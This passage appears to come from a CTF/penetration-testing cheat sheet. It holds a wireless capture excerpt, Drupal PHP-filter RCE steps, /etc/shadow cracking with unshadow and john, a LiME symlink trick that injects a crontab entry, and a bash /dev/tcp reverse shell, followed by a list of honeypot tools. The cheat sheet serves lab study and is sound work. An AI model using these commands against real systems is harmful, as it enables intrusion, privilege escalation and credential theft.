   13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
   13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
   13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
   13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
   13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
   13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:22.110144 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station

* Transfer an image
	
 :: 

   base64 flair.jpg 
   Copy output 
   vi flair 
   Paste the clipboard 
   base64 -d flair > flair.jpg

* It's always important to find, what's installed on the box:

 :: 

   dpkg-query -l 

 or using wild cards

 :: 

   dpkg-query -l 'perl*'



* Find recently modified files:

  ::

   find / -mmin -10 -type f 2>/dev/null

  The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.

* Getting a reverse shell from:

 * Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module.Once enabled we need to give permission to use it so in people -> permissions check "Use the PHP code text for. 
   
   Next I create a new block (by going to Blocks, under the Structure menu) with the following content. I make sure to select PHP code from the Text format drop down. Taken from <https://g0blin.co.uk/droopy-vulnhub-writeup/>
   Drupal settings file location: /var/www/html/sites/default/settings.php

* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.

* Want to send a email via the SMTP server something like SMTP-Open-Relay utilize `Swaks <http://www.jetmore.org/john/code/swaks/>`_ Swiss Army Knife for SMTP.

  ::

   swaks --to xxxxx@example.com --from xxxxxee@example.edu --server 192.168.110.105:2525 --body "Hey Buddy How are you doing" --header "Subject: Hello! Long time"

* Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.

 ::

  unshadow passwd shadown


* In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at

  ::

   /tmp/ramdump

  If, you create a symlink from /tmp/ramdump to /etc/crontab

  ::

   ln -s /etc/crontab /tmp/ramdump

  Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as 

  ::

   cat cron.py
   print "* * * * * root /bin/bash /home/username/evilscript"
  
  the injected string will end up in /etc/crontab will be executed.

  The contents of evilscript can be

  ::

   /bin/bash -i >& /dev/tcp/IP/Port 0>&1

  which will provide the root shell to the attacker. Thanks to TheColonial :)
   
* Handy Stuff

 * Utilize xxd to convert hex to ascii

  ::

   xxd -r -p
   -p | -ps | -postscript | -plain : output in postscript continuous hexdump style. Also known as plain hexdump style.
   -r | -revert : reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere.

 * Use python

  * binascii.unhexlify(hexstr) to convert hex to string
  * base64.decodestring(str) to decode base64 string


Cyber-Deception
===============

Wordpot
-------

`Wordpot <https://github.com/gbrindisi/wordpot>`_ : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.

::

 python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress

FakeSMTP
--------

`FakeSMTP <http://nilhcem.com/FakeSMTP/>`_ : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.

::

  java -jar /opt/fakesmtp/target/fakeSMTP-2.1-SNAPSHOT.jar -s -b -p 2525 127.0.0.1 -o /home/WeaselLaugh

Rubberglue
----------

`Rubberglue <https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md>`_ : We can use Rubberglue to listen on a port such that any traffic it recieves on that port it will forward back to the client ( attacker ) on the same port.

::

  python2 /opt/honeyports/honeyports-0.4.py -p 23

Knockd
------

`Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.

.. disqus::
